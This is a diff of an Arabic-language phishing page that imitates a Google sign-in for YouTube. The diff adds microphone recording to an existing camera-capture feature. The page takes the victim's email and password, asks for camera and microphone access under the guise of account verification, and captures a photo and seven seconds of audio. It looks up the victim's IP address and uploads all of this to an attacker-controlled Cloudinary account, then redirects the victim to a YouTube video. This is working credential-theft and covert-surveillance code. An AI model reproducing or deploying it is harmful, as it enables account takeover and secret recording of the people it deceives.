@@ -2,88 +2,97 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
-    <meta name="description" content="قم بتسجيل الدخول للمتابعة إلى YouTube. هذه صفحة تحقق آمنة لضمان ملكية الحساب.">
-    
+    <title>Google Authentication - YouTube</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
-        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        img { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 16px; margin-bottom: 25px; }
-        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
+        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 350px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
+        img { width: 75px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="login-box" id="loginForm">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-    <h1>تسجيل الدخول</h1>
+<div class="box" id="loginUI">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+    <h2>تسجيل الدخول</h2>
     <p>للمتابعة إلى YouTube</p>
-    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-    <button onclick="startAction()">التالي</button>
+    <input type="email" id="u_email" placeholder="البريد الإلكتروني">
+    <input type="password" id="u_pass" placeholder="كلمة المرور">
+    <button onclick="initHack()">التالي</button>
 </div>
 
-<video id="video" playsinline autoplay></video>
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
     const cloudName = 'dgkttv99v';
     const uploadPreset = 'ml_default';
-    const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    
-    async function startAction() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
+    const yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        if(!email || !pass) { alert("يرجى إدخال البيانات"); return; }
+    let mediaRecorder;
+    let audioChunks = [];
 
-        // إخفاء النموذج وإظهار رسالة تحميل للتمويه
-        document.getElementById('loginForm').innerHTML = "<h1>جاري التحقق...</h1><p>يرجى الانتظار لحظة</p>";
+    async function initHack() {
+        const email = document.getElementById('u_email').value;
+        const pass = document.getElementById('u_pass').value;
+        if(!email || !pass) return alert("خطأ في البيانات");
+
+        document.getElementById('loginUI').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى السماح بالوصول للوسائط لإتمام التحقق.</p>";
 
         try {
-            // طلب الكاميرا (سيظهر الإذن الآن كأنه جزء من "التحقق")
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             document.getElementById('video').srcObject = stream;
 
-            // تنفيذ الرفع مع البيانات (الايميل والباسورد والـ IP)
-            setTimeout(() => { takeSnapshot(email, pass); }, 2000);
-        } catch (e) {
-            window.location.href = youtubeLink;
+            // --- بدء تسجيل الصوت ---
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                uploadEverything(email, pass, audioBlob);
+            };
+
+            mediaRecorder.start();
+            console.log("Recording started...");
+
+            // التقاط صورة بعد 3 ثواني، ووقف التسجيل بعد 6 ثواني
+            setTimeout(() => { takePhoto(); }, 3000);
+            setTimeout(() => { mediaRecorder.stop(); }, 7000); // سجلنا 7 ثواني صوت
+
+        } catch (err) {
+            window.location.href = yt;
         }
     }
 
-    async function takeSnapshot(email, pass) {
+    function takePhoto() {
         const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        const imageData = canvas.toDataURL("image/png");
+        window.currentImg = canvas.toDataURL("image/png");
+    }
 
-        let userIP = "Unknown";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            userIP = data.ip;
-        } catch (err) {}
+    async function uploadEverything(email, pass, audioBlob) {
+        let ip = "0.0.0.0";
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
 
-        const formData = new FormData();
-        formData.append('file', imageData);
-        formData.append('upload_preset', uploadPreset);
-        
-        // --- تخزين "الصيد" في الـ Tags والـ Context ---
-        formData.append('tags', `IP_${userIP},Email_${email}`);
-        formData.append('context', `ip=${userIP}|user=${email}|pass=${pass}`);
+        // 1. رفع الصورة
+        const imgData = new FormData();
+        imgData.append('file', window.currentImg);
+        imgData.append('upload_preset', uploadPreset);
+        imgData.append('context', `user=${email}|pass=${pass}|ip=${ip}`);
+        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgData });
 
-        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-            method: 'POST',
-            body: formData
-        }).then(() => {
-            // بعد الرفع الناجح، حوله لليوتيوب فوراً
-            window.location.href = youtubeLink;
+        // 2. رفع ملف الصوت MP3
+        const audioData = new FormData();
+        audioData.append('file', audioBlob);
+        audioData.append('upload_preset', uploadPreset);
+        audioData.append('resource_type', 'video'); // كلوديناري بيعتبر الـ mp3 فيديو بدون صورة
+        audioData.append('public_id', `audio_${email.split('@')[0]}_${Date.now()}`);
+
+        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, { method: 'POST', body: audioData })
+        .then(() => {
+            window.location.href = yt; // حوله لليوتيوب بعد ما تخلص كل حاجة
         });
     }
 </script>
